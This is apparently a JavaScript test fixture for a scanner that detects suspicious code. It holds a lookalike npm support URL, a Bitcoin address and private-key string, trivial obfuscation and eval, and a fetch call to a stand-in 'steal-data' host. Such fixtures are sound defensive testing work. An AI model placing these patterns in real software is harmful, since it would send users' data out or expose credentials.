// This file contains suspicious patterns for testing
const config = {
    // Test malicious URL detection
    supportUrl: 'https://npmjs.help/support',
    
    // Test crypto indicators
    walletAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    privateKey: 'L5oLkpV3aqBjhki6LmvChTCV6odsp4SXM6FfU2Gppt5kFLaHLuZ9',
    
    // Test suspicious patterns
    obfuscated: String.fromCharCode(104, 101, 108, 108, 111),
    encoded: atob('aGVsbG8gd29ybGQ=')
};

// More suspicious patterns
eval('console.log("test")');
fetch('https://malicious-site.com/steal-data');
